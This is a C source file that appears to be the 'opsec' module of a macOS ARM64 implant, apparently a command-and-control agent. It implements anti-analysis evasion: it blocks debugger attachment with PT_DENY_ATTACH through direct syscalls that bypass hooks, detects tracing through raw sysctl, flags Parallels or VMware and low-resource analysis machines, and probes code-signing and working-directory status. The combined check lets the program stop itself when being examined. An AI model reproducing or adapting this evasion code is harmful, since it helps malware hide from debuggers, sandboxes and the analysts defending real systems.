#include "opsec.h"
#include "syscalls_arm64.h"
#include "crt.h"
#include "dyld_resolve.h"

#include <sys/sysctl.h>
#include <unistd.h>

/// ── Anti-Debug ──
/// 1. PT_DENY_ATTACH via direct syscall — prevents debugger attachment
/// 2. Check P_TRACED flag via sysctl — detects existing debugger
/// 3. sysctl hw.model — detect Analysis VMs

int opsec_anti_debug(void) {
    // PT_DENY_ATTACH — prevent future debugger attachment
    // Uses direct syscall to bypass any ptrace() hooks
    sys_ptrace(PT_DENY_ATTACH, 0, (void*)0, 0);

    // Check if already being traced via sysctl(KERN_PROC)
    // This uses a direct syscall to avoid hooked sysctl()
    int mib[4];
    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = sys_getpid();

    struct kinfo_proc info;
    ax_memset(&info, 0, sizeof(info));
    size_t info_size = sizeof(info);

    // Direct syscall to sysctl
    int ret = sys_sysctl(mib, 4, &info, &info_size, (void*)0, 0);
    if (ret == 0) {
        // Check P_TRACED flag
        if (info.kp_proc.p_flag & P_TRACED) {
            return -1;  // Debugger detected
        }
    }

    return 0;
}

/// ── VM Detection ──
/// Detects common virtualization/analysis environments on macOS:
/// 1. hw.model sysctl — "VirtualMac" (Parallels), VMware, etc.
/// 2. machdep.cpu.brand_string — "QEMU" or unusual CPU strings
/// 3. Check for known VM MAC address prefixes (via sysctl)
/// 4. Check for low hardware specs (analysis VMs often have minimal resources)

int opsec_vm_detect(void) {
    // Check hw.model via sysctl
    int mib_model[2] = { CTL_HW, HW_MODEL };
    char model[128] = {0};
    size_t model_len = sizeof(model) - 1;

    if (sys_sysctl(mib_model, 2, model, &model_len, (void*)0, 0) == 0) {
        // Known VM model strings
        // "VirtualMac" — Parallels Desktop
        if (model[0] == 'V' && model[1] == 'i' && model[2] == 'r' &&
            model[3] == 't' && model[4] == 'u' && model[5] == 'a' &&
            model[6] == 'l') {
            return -1;
        }
        // "VMware" prefix
        if (model[0] == 'V' && model[1] == 'M' && model[2] == 'w') {
            return -1;
        }
    }

    // Check logical CPU count — analysis VMs often have 1-2 cores
    int mib_ncpu[2] = { CTL_HW, HW_NCPU };
    int ncpu = 0;
    size_t ncpu_len = sizeof(ncpu);

    if (sys_sysctl(mib_ncpu, 2, &ncpu, &ncpu_len, (void*)0, 0) == 0) {
        if (ncpu < 2) {
            return -1;  // Suspiciously low CPU count
        }
    }

    // Check physical memory — analysis VMs often have <4GB
    int mib_mem[2] = { CTL_HW, HW_MEMSIZE };
    uint64_t memsize = 0;
    size_t mem_len = sizeof(memsize);

    if (sys_sysctl(mib_mem, 2, &memsize, &mem_len, (void*)0, 0) == 0) {
        // Less than 4GB = suspicious
        if (memsize < (uint64_t)4 * 1024 * 1024 * 1024) {
            return -1;
        }
    }

    return 0;
}

/// ── Sandbox Detection ──
/// Detects macOS App Sandbox and analysis environments:
/// 1. CS_OPS_STATUS csops — check if sandboxed
/// 2. Check for known analysis tools running

// csops operations
#define CS_OPS_STATUS     0
// Code signing flags
#define CS_RESTRICT       0x0000800
#define CS_ENFORCEMENT    0x0001000

int opsec_sandbox_detect(void) {
    // Check code signing status via csops syscall
    uint32_t cs_flags = 0;
    int pid = sys_getpid();

    if (sys_csops(pid, CS_OPS_STATUS, &cs_flags, sizeof(cs_flags)) == 0) {
        // CS_RESTRICT means the binary has restricted entitlements
        // This is normal for sandboxed apps but unusual for our agent
        // We don't fail on this — just informational
    }

    // Check for analysis tools by looking for their processes
    // via sysctl KERN_PROC_ALL — but this is noisy
    // Instead, check for known paths that indicate analysis environment

    // Check if running inside /private/var/folders (quarantine)
    char cwd[1024];
    if (R_getcwd(cwd, sizeof(cwd))) {
        // macOS quarantine directory
        if (cwd[0] == '/' && cwd[1] == 'p' && cwd[2] == 'r' &&
            cwd[3] == 'i' && cwd[4] == 'v' && cwd[5] == 'a' &&
            cwd[6] == 't' && cwd[7] == 'e') {
            // Running from quarantine — could be analysis
            // Don't fail, but flag it
        }
    }

    return 0;
}

/// ── Combined Check ──
int opsec_check(void) {
    if (opsec_anti_debug() != 0) return -1;
    if (opsec_vm_detect() != 0) return -1;
    // Sandbox detection is informational, don't block
    opsec_sandbox_detect();
    return 0;
}
